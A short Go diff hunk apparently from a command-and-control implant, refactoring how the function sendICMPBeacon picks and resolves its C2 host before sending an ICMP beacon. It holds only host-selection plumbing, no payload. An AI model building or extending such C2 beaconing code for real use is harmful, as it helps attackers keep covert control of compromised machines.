@@ -18,10 +18,11 @@ func sendICMPBeacon(body []byte) []byte {
 	if C2URL == "" {
 		return nil
 	}
-	host := C2URL
-	if urls := c2URLsSnapshot(); len(urls) > 0 {
-		host = c2URLAtIndex(int(currentC2Idx.Load()))
+	hostPort, _, ok := currentC2Dial()
+	if !ok {
+		return nil
 	}
+	host := hostnameFromHostPort(hostPort)
 
 	raddr, err := net.ResolveIPAddr("ip4", host)
 	if err != nil {
